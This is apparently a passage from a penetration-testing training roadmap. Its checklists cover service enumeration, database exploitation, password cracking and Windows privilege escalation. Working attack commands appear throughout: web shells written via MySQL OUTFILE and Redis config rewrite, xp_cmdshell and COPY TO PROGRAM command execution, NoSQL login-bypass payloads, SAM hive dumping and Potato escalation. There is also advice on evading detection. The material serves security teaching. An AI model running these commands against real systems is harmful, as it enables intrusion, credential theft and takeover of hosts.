
- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [NetExec](Tools/NetExec.md) (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.

- [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.

- [ ] **NFS Enumeration:** Use **showmount -e** to discover **exported shares**; check for **world-readable exports** and **root squash misconfigurations**.

- [ ] **SSH Enumeration:** Fingerprint **SSH versions, supported algorithms, key exchange methods** using **ssh-audit**; identify **weak ciphers, deprecated protocols**.

- [ ] **RDP Enumeration:** Use **nmap --script rdp-enum-encryption, rdp-ntlm-info** to extract **OS version, domain info, NLA requirements** from RDP endpoints.

---

<a id="stage-2-directory-identity-enumeration"></a>

### **Stage 2: Directory & Identity Enumeration** — `🔬 Practical`

> [!TIP]
> **Goal:** Map users, groups, and organizational structure from directory services.

- [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.

- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [BloodHound](Tools/BloodHound.md)** to map **domain trusts, group membership, SPNs, delegation**.

- [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.

- [ ] **SMTP Enumeration:** Use **VRFY, EXPN, RCPT TO** commands to **verify valid email addresses and usernames** on mail servers.

- [ ] **RPC Enumeration:** Use **rpcclient, rpcinfo** to enumerate **RPC endpoints, user SIDs, domain information, printer shares**.

---

<a id="stage-3-dns-infrastructure-enumeration"></a>

### **Stage 3: DNS & Infrastructure Enumeration** — `🔬 Practical`

> [!TIP]
> **Goal:** Extract naming, network, and infrastructure intelligence from DNS.

- [ ] **DNS Zone Transfer:** Attempt **AXFR/IXFR** transfers to extract **full DNS records** and internal hostnames.

- [ ] **DNS Record Enumeration:** Query **A, AAAA, MX, TXT, SRV, CNAME, NS, PTR** records to map **mail servers, services, subdomains, SPF/DMARC/DKIM** policies.

- [ ] **DNS Spoofing Prep:** Identify **DNS split-view** configurations and **internal domain naming** for **DNS rebinding attacks**.

- [ ] **Reverse DNS Sweeps:** Perform **PTR record lookups** across discovered IP ranges to reveal **hostnames, naming conventions, and hidden services**.

---

<a id="stage-4-database-application-enumeration"></a>

### **Stage 4: Database & Application Enumeration** — `🔬 Practical`

> [!TIP]
> **Goal:** Extract schemas, credentials, and data from discovered database and application services.

- [ ] **Database Discovery:** Identify **MySQL, MSSQL, PostgreSQL, Oracle, MongoDB, Redis, Elasticsearch** on standard/non-standard ports.

- [ ] **Database Default Creds:** Test **default credentials** (root/password, sa/sa, admin/admin) against discovered databases.

- [ ] **Database Information Schema:** Query **INFORMATION_SCHEMA** tables to enumerate **user accounts, object permissions, stored procedures**.

- [ ] **Backup & Recovery:** Identify **backup locations, recovery mode**, and **log files** that may contain **plaintext passwords or recovery keys**.

- [ ] **Web Application Enumeration:** Use **Gobuster, feroxbuster, ffuf** to discover **hidden directories, API endpoints, admin panels, configuration files, and backup archives** (.bak, .old, .swp).

---

<a id="stage-5-attack-surface-consolidation-enumeration-opsec"></a>

### **Stage 5: Attack Surface Consolidation & Enumeration OpSec** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Consolidate findings into an attack plan while maintaining stealth.

- [ ] **Attack Surface Map:** Combine all enumeration results into a **structured target profile** — users, credentials, shares, services, misconfigurations, and potential exploitation vectors.

- [ ] **Prioritized Attack Paths:** Rank targets by **exploitability and impact** — prioritize **null sessions, default credentials, writable shares, exposed admin panels, and AS-REP Roastable accounts**.

- [ ] **Tool Fingerprinting Awareness:** Understand that enumeration tools leave signatures — **vary User-Agents, throttle requests, rotate source IPs** where possible.

- [ ] **Timing Discipline:** Spread enumeration queries over time; avoid **rapid-fire LDAP/SMB/SNMP queries** that trigger **anomaly-based detection**.

- [ ] **Documentation:** Record all findings with **timestamps, source IPs, and tool commands** used — this feeds directly into **reporting and evidence collection**.

<a id="lab-progression-part-6-enumeration"></a>

### **Lab Progression (Part 6: Enumeration)**

| Level | Task                                                         | Deliverable                                    |
| ----- | ------------------------------------------------------------ | ---------------------------------------------- |
| 1     | Enumerate SMB shares and users on a Windows lab target       | Enumeration findings document                  |
| 2     | Enumerate SNMP on a network device (community strings, MIBs) | SNMP data export                               |
| 3     | Perform full LDAP enumeration against a lab AD domain        | User/group/OU listing                          |
| 4     | Enumerate DNS zone transfers and subdomain brute-forcing     | DNS enumeration report                         |
| 5     | Build a complete attack surface map from enumeration data    | Attack profile document with prioritized paths |

> [!IMPORTANT]
> **Move-On Gate:** You can enumerate services, users, shares, and misconfigurations across SMB, LDAP, SNMP, DNS, and web services, and produce a prioritized attack surface map.

---

<a id="part-6b-database-security"></a>


---

<a id="module-11-database-security"></a>
<a id="part-6b-database-security"></a>

## Module 11: Database Security


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `Web Application Hacking Advanced SQL Injection and Data Store Attacks` — DB internals chapters only now; save injection chapters for Phase 4
> - 🟡 `Database Security Problems and Solutions` — Full (reference) — attacker-focused DB misconfiguration and exploitation techniques


> [!NOTE]
> **Navigational Note — Why Part 6B Is Here:** Part 6B was added to Phase 2 during the roadmap's v2.0 audit because database exploitation surfaces appear across Phases 2, 4, 6, and 7 but had no dedicated systematic module. SQLi (Part 17, Phase 4) covers injection attacks against web applications that query databases — it does NOT cover direct database engine exploitation. Part 6B fills that gap. Complete this before Part 31 and Part 7.

> [!IMPORTANT]
> **Prerequisites:** Part 6 (Enumeration) — specifically Stage 4 (Database & Application Enumeration). You should already be able to identify running database services and version-fingerprint them. This Part teaches you what to do after enumeration.

<a id="part-6b-stage-1-database-enumeration-fingerprinting"></a>

### **Stage 1: Database Enumeration & Fingerprinting** — `🔬 Practical`

> [!TIP]
> **Goal:** Identify database engine, version, authentication mechanism, and attack surface before attempting exploitation.

- [ ] **Service Discovery:** Scan for database services on standard and non-standard ports:
  - MySQL / MariaDB: 3306 | MSSQL: 1433 (TCP), 1434 (UDP browser) | PostgreSQL: 5432
  - Oracle: 1521 (TNS) | MongoDB: 27017 | Redis: 6379 | Elasticsearch: 9200 (HTTP), 9300 (cluster)
  - Use: `nmap -sV -p 1433,3306,5432,1521,27017,6379,9200 <target>`

- [ ] **Version Fingerprinting & Banner Grabbing:**
  - MySQL: `nmap --script mysql-info -p 3306 <target>` or `mysql -h <target> -u root`
  - MSSQL: `nmap --script ms-sql-info -p 1433 <target>` or `sqlcmd -S <target> -Q "SELECT @@VERSION"`
  - PostgreSQL: `psql -h <target> -U postgres`
  - Redis: `redis-cli -h <target> PING` then `INFO server`
  - Elasticsearch: `curl http://<target>:9200/`

- [ ] **Default Credentials Testing:**
  - MySQL: `root`/(empty), `root`/`root`, `root`/`password`
  - MSSQL: `sa`/(empty), `sa`/`sa`
  - PostgreSQL: `postgres`/`postgres`, `postgres`/(empty)
  - Oracle: `sys`/`change_on_install`, `system`/`manager`, `scott`/`tiger`
  - MongoDB/Redis (older): no authentication by default — direct connection succeeds
  - Use `nmap --script=<db>-brute` for automated default credential testing

- [ ] **Schema Enumeration (Authenticated):**
  - MySQL: `SELECT * FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');`
  - MSSQL: `SELECT name FROM master.dbo.sysdatabases;` then `USE <db>; SELECT * FROM information_schema.tables;`
  - PostgreSQL: `\l`, `\c <db>`, `\dt`
  - Oracle: `SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM');`

---

<a id="part-6b-stage-2-relational-database-exploitation"></a>

### **Stage 2: Relational Database Exploitation** — `🔬 Practical`

> [!TIP]
> **Goal:** Escalate from database access to OS command execution and credential extraction.

**MySQL / MariaDB:**

- [ ] **FILE Privilege Exploitation:** With `FILE` privilege, read OS files: `SELECT LOAD_FILE('/etc/passwd');` and write files: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` (requires `secure_file_priv` to be empty or set to a writable path).

- [ ] **User Defined Functions (UDFs):** Upload a malicious shared library to the plugin directory, create a UDF from it, and execute OS commands:

  ```sql
  SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('id > /tmp/pwned.txt');
  ```

- [ ] **MySQL Hash Extraction:** `SELECT user, authentication_string FROM mysql.user;` — MySQL 8+ uses `caching_sha2_password`. Crack with `hashcat -m 7401`.

**MSSQL:**

- [ ] **`xp_cmdshell` OS Command Execution:**

  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  EXEC xp_cmdshell 'powershell -EncodedCommand <base64_payload>';
  ```

- [ ] **Linked Server Pivoting:** Query remote databases via linked server definitions — execute commands on linked servers with `EXEC ('EXEC xp_cmdshell ''whoami''') AT [linked_server_name];`. Enumerate: `SELECT * FROM sys.servers WHERE is_linked = 1;`

- [ ] **CLR Assemblies:** Load a .NET assembly as a stored procedure to execute arbitrary .NET code (requires `clr enabled = 1` and sysadmin).

- [ ] **Impersonation (`EXECUTE AS`):** `EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT;` — works if the current login has `IMPERSONATE` permission on the target login.

- [ ] **MSSQL Hash Extraction:** `SELECT name, password_hash FROM sys.sql_logins;` (requires sysadmin). Crack with `hashcat -m 1731`.

**PostgreSQL:**

- [ ] **`COPY TO PROGRAM` — OS Command Execution:** `COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';` (superuser only)

- [ ] **`pg_read_file` — File Read:** `SELECT pg_read_file('/etc/passwd', 0, 100000);`

- [ ] **`lo_export` — File Write via Large Objects:** Write arbitrary content to arbitrary paths using `lo_from_bytea` + `lo_export`.

**Oracle:**

- [ ] **UTL_FILE / Java Stored Procedures:** File read/write via UTL_FILE directory objects. OS command execution via Java stored procedures if Java is enabled and permissions granted.

- [ ] **DB Links:** Enumerate with `SELECT * FROM dba_db_links;` — execute queries across links: `SELECT * FROM table@remote_db_link;`

---

<a id="part-6b-stage-3-nosql-modern-database-attacks"></a>

### **Stage 3: NoSQL & Modern Database Attacks** — `🔬 Practical`

> [!TIP]
> **Goal:** Attack non-relational databases — different injection syntax, different attack surfaces, different default security postures.

**MongoDB:**

- [ ] **Unauthenticated Access:** MongoDB < 2.6 and many misconfigured deployments run without authentication. Test: `mongosh <target>:27017`. Enumerate: `show dbs; use admin; db.system.users.find();`

- [ ] **NoSQL Injection (via Web App):** When user input reaches MongoDB queries without sanitisation:
  - Login bypass: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` — matches any non-empty username/password
  - Data extraction: `{"username": {"$regex": "admin"}, "password": {"$gt": ""}}` — regex enumeration

- [ ] **`$ne` Authentication Bypass:** `db.users.find({"username": "admin", "password": {"$ne": "wrong"}})` — finds admin where password is NOT "wrong" (always matches if admin exists).

**Redis:**

- [ ] **Unauthenticated Access:** Redis defaults to no auth on localhost. When exposed externally: `redis-cli -h <target> INFO server`

- [ ] **Config Rewrite RCE (Web Shell):**

  ```bash
  redis-cli -h <target> CONFIG [SET](Tools/SET.md) dir /var/www/html
  redis-cli -h <target> CONFIG SET dbfilename shell.php
  redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
  redis-cli -h <target> SAVE
  ```

- [ ] **SSH Key Injection:** If Redis runs as a user with an SSH directory, inject your public key into `authorized_keys` via `CONFIG SET dir` + `CONFIG SET dbfilename authorized_keys` + `SET sshkey "$(cat ~/.ssh/id_rsa.pub)"` + `SAVE`.

- [ ] **Module Loading RCE:** Redis 4.0+ supports `MODULE LOAD /path/to/malicious.so` for arbitrary code execution.

**Elasticsearch:**

- [ ] **Unauthenticated Data Access (< 8.0):** `curl http://<target>:9200/_cat/indices?v` to list indices. `curl http://<target>:9200/<index>/_search?pretty` to dump data.

---

<a id="part-6b-stage-4-database-privilege-escalation"></a>

### **Stage 4: Database Privilege Escalation** — `🔬 Practical`

> [!TIP]
> **Goal:** Move from low-privileged DB access to OS command execution and system-level access.

- [ ] **Vertical Escalation Within DB Engine:**
  - MySQL: Low-priv user → compromise MySQL root → grant `FILE` privilege → read `/etc/shadow` or write web shell
  - MSSQL: `db_datareader` → find TRUSTWORTHY database owned by sysadmin → escalate via `CREATE PROCEDURE` in TRUSTWORTHY context
  - Check MSSQL: `SELECT name, is_trustworthy_on FROM sys.databases;`

- [ ] **Token Impersonation via DB Service Account (Windows):** MSSQL often runs with `SeImpersonatePrivilege`. After `xp_cmdshell` RCE: `xp_cmdshell 'whoami /priv'`. If SeImpersonatePrivilege present, escalate to SYSTEM with PrintSpoofer or GodPotato.

- [ ] **Cross-Database Escalation (MSSQL):** A `db_owner` in a TRUSTWORTHY database can escalate to `sysadmin`: `EXECUTE AS USER = 'dbo'; EXEC master..xp_cmdshell 'whoami';`

---

<a id="part-6b-stage-5-database-auditing-defence"></a>

### **Stage 5: Database Auditing & Defence** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Understand the defender-side mitigations that block the attacks above.

- [ ] **Least Privilege Service Accounts:** Application DB users should only have SELECT/INSERT/UPDATE on specific tables — never `FILE`, `xp_cmdshell`, `SUPER`. `xp_cmdshell` should be disabled by default (check: `SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`). MySQL `secure_file_priv` should not be empty.

- [ ] **Network Isolation:** DB ports (3306, 1433, 5432, 27017, 6379) should not be reachable from the internet or workstation subnets — only from dedicated application server subnets.

- [ ] **Authentication Hardening:**
  - MySQL: Disable `test` database, remove anonymous accounts, enforce password complexity
  - MSSQL: Prefer Windows Authentication over SQL Authentication
  - Redis: Set `requirepass <strong_password>` and bind to `127.0.0.1` only
  - MongoDB: Enable `auth = true` in `mongod.conf` with role-based users

- [ ] **Audit Logging:**
  - MSSQL: SQL Server Audit, Extended Events — log `xp_cmdshell`, `EXECUTE AS`, linked server queries, `CREATE PROCEDURE`
  - MySQL: `general_log = ON`; `audit_log` plugin for compliance
  - PostgreSQL: `log_statement = 'all'` or `pgaudit` extension

<a id="part-6b-lab-progression"></a>

### **Lab Progression (Part 6B: Database Security)**

| Level | Task                                                                         | Deliverable                                                   |
| ----- | ---------------------------------------------------------------------------- | ------------------------------------------------------------- |
| 1     | Local MySQL lab: create a low-priv user, escalate via `FILE` privilege abuse | Step-by-step attack documentation                             |
| 2     | MSSQL in a lab VM: enable `xp_cmdshell`, execute OS commands, extract hashes | Command log + hash extraction proof                           |
| 3     | Redis without auth: RCE via config rewrite (web shell method)                | Working web shell demonstration                               |
| 4     | MongoDB without auth: enumerate collections, test `$ne` auth bypass          | Injection payload documentation                               |
| 5     | Full DB attack chain on HackTheBox/VulnHub machine with exposed DB service   | Pentest-style report: enumeration → exploitation → escalation |

> [!IMPORTANT]
> **Move-On Gate:** You can enumerate database services, identify engine and version, test default credentials, achieve OS command execution on at least one DB engine (MySQL or MSSQL), and explain the defensive controls that would prevent each attack. Document every command and finding.

---

<a id="part-31-password-cracking-hash-analysis"></a>


---

<a id="module-12-password-cracking--hash-analysis"></a>
<a id="part-31-password-cracking-hash-analysis"></a>

## Module 12: Password Cracking & Hash Analysis


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `Hacking_ The Art Of Exploitation 2nd Edition` — Cryptography and hashing chapter — ground-truth explanation of how hashes work and why cracking is possible
> - 🟡 `Reverse Engineering and Password Breaking` — Full (short) — direct coverage of hash formats and cracking methodology
> - 🟢 `Computer & Internet Security A Hands on Approach 2nd Ed` — Authentication chapters — explains salting, key derivation, and why bcrypt/Argon2 resist cracking


> [!NOTE]
> **Navigational Note — Why Part 31 Is Here:** Part 31 is numbered non-sequentially (Parts 4–6, then 31, then 7–...) because it was added to Phase 2 after the original numbering scheme was established. It sits here — between Part 6 (Enumeration) and Part 7 (System Hacking) — because password cracking is a **direct prerequisite for Part 7**: you cannot use Pass-the-Hash, Kerberoasting, or credential-based lateral movement without first understanding hash types, cracking methodology, and offline attack mechanics. Parts 8–30 do not exist in Phase 2 — they are in later phases. Continue to Part 7 after completing this.

<a id="stage-1-hash-identification-acquisition"></a>

### **Stage 1: Hash Identification & Acquisition** — `🔬 Practical`

> [!TIP]
> **Goal:** Identify what you have before cracking.

- [ ] **Hash Identification:** Use **hashid, hash-identifier, Name-That-Hash** to identify algorithm from hash format (length, prefix like `$2y$`, `$6$`, `$NT$`).

- [ ] **Hash Acquisition:** Obtain hashes from **SAM/NTDS.dit (Windows), /etc/shadow (Linux), database dumps, LSASS memory, pcap files, web app source**.

- [ ] **Common Hash Types:** Master identifying and handling **NTLM, NTLMv1/v2, NetNTLM, MD5, SHA-1, SHA-256, bcrypt, Argon2, PBKDF2, WPA2-PMKID, Kerberos (5/17/18/23)**.

---

<a id="stage-2-cracking-methodology-tools"></a>

### **Stage 2: Cracking Methodology & Tools** — `🔬 Practical`

> [!TIP]
> **Goal:** Apply the right technique to each hash type.

- [ ] **[Hashcat](Tools/Hashcat.md) Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.

- [ ] **[John the Ripper](Tools/John_the_Ripper.md):** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).

- [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.

- [ ] **Rule-Based Attacks:** Apply **Hashcat rules (best64.rule, OneRuleToRuleThemAll, d3ad0ne)** to mangle wordlists — capitalize, add numbers, leet-speak substitutions — to crack complex passwords efficiently.

- [ ] **Mask Attacks:** Use **Hashcat mask syntax** (`?u?l?l?l?l?d?d?s`) to brute-force **known password patterns** (e.g., company naming conventions, seasonal passwords like `Summer2024!`).

- [ ] **Hybrid Attacks:** Combine **wordlist + mask** (`-a 6` / `-a 7`) to crack passwords like `rockyou_words + 2024!` or `!2024 + rockyou_words`.

- [ ] **Rainbow Tables:** Understand **precomputed hash-to-plaintext lookup tables** and why **salting defeats them**; use **RainbowCrack** for legacy unsalted MD5/SHA1.

---

<a id="stage-3-protocol-specific-cracking"></a>

### **Stage 3: Protocol-Specific Cracking** — `🔬 Practical`

> [!TIP]
> **Goal:** Crack hashes captured from real network protocols.

- [ ] **NTLM / NetNTLMv2:** Capture with **[Responder](Tools/Responder.md), ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.

- [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.

- [ ] **WPA2 Handshakes:** Crack **4-way handshake (-m 22000)** and **PMKID (-m 22001)** from wireless captures with GPU-accelerated hashcat.

- [ ] **SSH Private Keys:** Use **ssh2john** to extract crackable hash from passphrase-protected keys; crack with JtR.

- [ ] **Office / PDF / ZIP:** Extract hashes with **office2john, pdf2john, zip2john**; crack with JtR or hashcat for document password recovery.

---

<a id="stage-4-wordlist-intelligence-curation"></a>

### **Stage 4: Wordlist & Intelligence Curation** — `🔬 Practical`

> [!TIP]
> **Goal:** Build targeted wordlists that outperform generic lists.

- [ ] **OSINT-Driven Wordlists:** Use **CeWL** to spider target websites and extract **company-specific vocabulary** for highly targeted password lists.

- [ ] **Custom Rule Writing:** Write **Hashcat/JtR rules** encoding target's known password policy — minimum length, required chars, common suffix patterns.

- [ ] **Credential Stuffing Lists:** Use **breach corpora (Collection #1, Dehashed)** to build target-specific lists from previously leaked passwords for the same user base.

- [ ] **Mentalist / PACK:** Use **Mentalist (GUI) or PACK (Policy Analysis)** to analyze cracked passwords and generate statistically optimized masks and rules.

> 📌 **Cross-Reference:** Password cracking skills are directly applied in **[Stage 4: Module 19 (Active Directory & Entra ID)](Stage-4_Enterprise.md#module-19-active-directory--entra-id)** (Kerberoasting, AS-REP Roasting), **[Shelf 01: Wireless Network Security](Shelf_Post-Hire.md#shelf-01-wireless-network-security)** (WPA handshake cracking), and **Part 7: System Hacking** (credential-based lateral movement). Complete this Part before Phase 5–6.

---

<a id="toc-part-7-system-hacking--initial-compromise"></a>
<a id="part-7-system-hacking-initial-compromise"></a>


---

<a id="module-13-system-hacking--initial-compromise"></a>
<a id="part-7-system-hacking-initial-compromise"></a>

## Module 13: System Hacking & Initial Compromise


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `The Hacker Playbook 3 (Red Team Edition)` — Primary companion — initial access, privesc, persistence — read chapters in parallel with labs
> - 🔴 `Hacking_ The Art Of Exploitation 2nd Edition` — Shellcode, stack/heap overflows — the foundational exploitation textbook; understand WHY exploits work
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open always as command reference
> - 🟡 `The Hacker Playbook 2` — Exploitation and post-exploitation — practical walk-through of real techniques
> - 🟡 `Gray Hat Hacking The Ethical Hacker's Handbook 2022` — System exploitation, modern privesc techniques
> - 🟢 `Exploitation Techniques and Tools` — Technique catalog — use as lookup when encountering a specific technique in labs
> - 🟢 `Exploit Development on Linux Platform` — Full — Linux-specific exploitation fundamentals


<a id="stage-1-the-breach-initial-access-exploitation"></a>

### **Stage 1: The Breach (Initial Access & Exploitation)** — `🔬 Practical`

> [!TIP]
> **Goal:** Weaponize theoretical vulnerabilities to bypass the perimeter and establish foothold.

**Application & Web Exploitation:**

- [ ] **SQL Injection:** Craft payloads for **error-based, blind, union-based, and time-based** exfiltration.

- [ ] **Buffer Overflow:** Target legacy binaries; craft **ROP chains** to bypass **ASLR/DEP**.

- [ ] **Directory/Path Traversal:** Abuse improper input validation to read **system files, configs, or keys**.

- [ ] **SSTI/Template Injection:** Exploit **Jinja2, Twig, ERB** misconfigs for **RCE**.

- [ ] **Deserialization:** Attack unsafe **Java/Python/PHP** unmarshaling for code execution.

- [ ] **SSRF:** Abuse server trust to pivot to **internal APIs, cloud metadata (IMDS), or localhost services**.

- [ ] **XXE/XML External Entity:** Parse malicious XML for **file read, XXE blind**, and **DOS**.

- [ ] **API Endpoint Abuse:** Exploit **BOLA/BFLA** (Broken Object/Function Level Auth) and **rate-limit bypass**.

- [ ] **Authentication Bypass:** Exploit **logic flaws** in login flows, abuse **password reset tokens**, manipulate **OAuth state parameters**.

- [ ] **Business Logic Flaws:** Identify **race conditions, insufficient workflow validation, price manipulation** in checkout/transaction flows.

- [ ] **File Upload Vulnerabilities:** Bypass **extension filters**, use **null bytes, double extensions, MIME type confusion** to upload **web shells**.

- [ ] **CAPTCHA Bypass:** Exploit **client-side validation**, reuse **tokens**, automate with **OCR/ML models**, abuse **audio alternatives**.

- [ ] **GraphQL Exploitation:** Perform **introspection queries**, abuse **batching/aliasing** for **DoS**, exploit **nested queries** and **IDOR**.

**Credential Assault:**

- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[Hydra](Tools/Hydra.md)** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[Hashcat](Tools/Hashcat.md)** + **[John the Ripper](Tools/John_the_Ripper.md)** for offline hash cracking.

- [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.

- [ ] **Default Creds:** Enumerate and test **factory defaults** (admin/admin, root/root).

- [ ] **MFA Bypass:** Exploit **MFA fatigue, SIM-swap, push notification spoofing**.

- [ ] **Credential Stuffing:** Reuse leaked passwords from **breach corpuses** (HIBP/Dehashed).

**Human Vector & Social Engineering:**

- [ ] **Phishing:** Craft **HTML-smuggled payloads, ISO/LNK loaders, OneNote macros** with pretexting.

- [ ] **Whaling/Spear Phishing:** Target **executives** with personalized, researched lures.

- [ ] **Smishing/Vishing:** Use **SMS/voice** to deliver **URL shorteners, MFA prompts, or fake updates**.

- [ ] **Pretext:** Build **fake contractor, vendor, or IT support** persona to extract credentials verbally.

- [ ] **Watering Hole:** Compromise **public websites** frequented by targets to deliver **malware/tracker**.

**Network Interception & MITM:**

> **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Part 9: Sniffing & Spoofing** (Phases 3–4). WiFi evil twin attacks are covered in **Part 21: Wireless Pentesting**. The techniques here focus on using these as delivery mechanisms for social engineering — review Part 9 first.

- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[tcpdump](Tools/tcpdump.md)/Wireshark**.

---

<a id="stage-2-the-ascension-privilege-escalation"></a>

### **Stage 2: The Ascension (Privilege Escalation)** — `🔬 Practical`

> [!TIP]
> **Goal:** Move from low-level foothold to administrative control by exploiting system logic.

**Windows Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Windows is the dominant enterprise OS. Every red team engagement involves Windows privilege escalation. The six bullets below from the original stub are insufficient — work through each vector with a dedicated lab VM (TryHackMe "Windows PrivEsc" room, HackTheBox Blue/Optimum/Bastard, or build your own intentional misfig VM). **winPEAS** and **PowerUp** automate discovery — but you must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Automated Enumeration:** Run **winPEAS** (`[winpeas](Tools/WinPEAS.md).exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).

- [ ] **Manual Baseline Commands:** On foothold, immediately run:
  - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
  - `whoami /groups` — identify group memberships and integrity level
  - `net user %username%` — full user attributes, password expiry, group membership
  - `systeminfo | findstr /i "os name os version hotfix"` — OS version and installed patches
  - `wmic qfe get hotfixid` — list all patches; cross-reference with missing-patch exploit databases
  - `sc query` — enumerate all running services
  - `tasklist /svc` — processes with associated services
  - `netstat -ano` — active network connections and PIDs (identify locally-listening services)
  - `schtasks /query /fo LIST /v` — all scheduled tasks with owners and paths

**Vector 1: Service Misconfigurations**

- [ ] **Unquoted Service Paths:** When a service binary path contains spaces and is unquoted (e.g., `C:\Program Files\Vuln App\service.exe`), Windows will try `C:\Program.exe` first. If you can write to any parent directory, drop a malicious `Program.exe` to escalate.
  - Discovery: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`
  - Also: PowerUp `Get-UnquotedService`

- [ ] **Weak Service Binary Permissions:** If you can overwrite the service binary itself, replace it with a payload.
  - Discovery: `icacls "C:\path\to\service.exe"` — look for `(W)` or `(F)` for current user or Everyone group

- [ ] **Weak Service Registry Permissions:** Registry key controlling a service's image path. If writable, change the binary path.
  - Discovery: `Get-ACL "HKLM:\System\CurrentControlSet\Services\VulnSvc"`

**Vector 2: DLL Hijacking**

- [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
  - Discovery: **[Procmon](Tools/Procmon.md)** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs

- [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.

- [ ] **Side-Loading:** High-privileged applications loading DLLs from user-writable locations. Common in enterprise software that runs as SYSTEM but loads plugins from user directories.

**Vector 3: Token Impersonation & Potato Exploits**

- [ ] **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** These privileges (held by IIS service accounts, SQL Server service, local service) allow impersonating any token, including SYSTEM. This is the most common path from `NT AUTHORITY\NETWORK SERVICE` → SYSTEM.
  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe` (named pipe impersonation via spoolsv)
  - **JuicyPotato** (Windows Server 2016 and below): requires a CLSID for a COM server running as SYSTEM
  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"` (abuses DCOM / storage interface)
  - **SweetPotato / BadPotato / RoguePotato**: Versatile potato variants bypassing DCOM activation restrictions
  - Discovery: `whoami /priv` → look for `SeImpersonatePrivilege Enabled`

- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, attach to any running process including LSASS and winlogon.exe, duplicate their tokens, and impersonate SYSTEM or dump credentials.
  - Tools: `incognito.exe`, Meterpreter `getsystem`, custom Win32 token duplicate scripts

- [ ] **Data Extraction via SeBackupPrivilege & SeRestorePrivilege:**
  - `SeBackupPrivilege`: Grants full read access to any file on the system regardless of NTFS permissions.
    - Exploit: Dump SAM and SYSTEM hives directly: `reg save HKLM\SAM C:\temp\sam` & `reg save HKLM\SYSTEM C:\temp\system`, or copy locked `NTDS.dit` via robocopy/diskshadow.
  - `SeRestorePrivilege`: Grants full write access to any file on disk.
    - Exploit: Overwrite service binaries or replace system DLLs / sticky keys (`sethc.exe`) to obtain SYSTEM execution.

- [ ] **SeTakeOwnershipPrivilege:** Allows user to take ownership of any securable object (files, registry keys).
  - Exploit: Take ownership using `takeown /f C:\Windows\System32\utilman.exe` and grant full control via `icacls`, then substitute with payload.

**Vector 4: UAC Bypass Mechanics**

- [ ] **UAC Architecture & Integrity Levels:** User Account Control isolates standard users and elevated administrators via Integrity Levels (Low, Medium, High, System). Standard admin accounts run in Medium Integrity by default; UAC bypasses allow moving from Medium Integrity to High Integrity silently without triggering a Consent UI prompt.

- [ ] **Auto-Elevation Abuse & Registry Hijacking (UACME Project):**
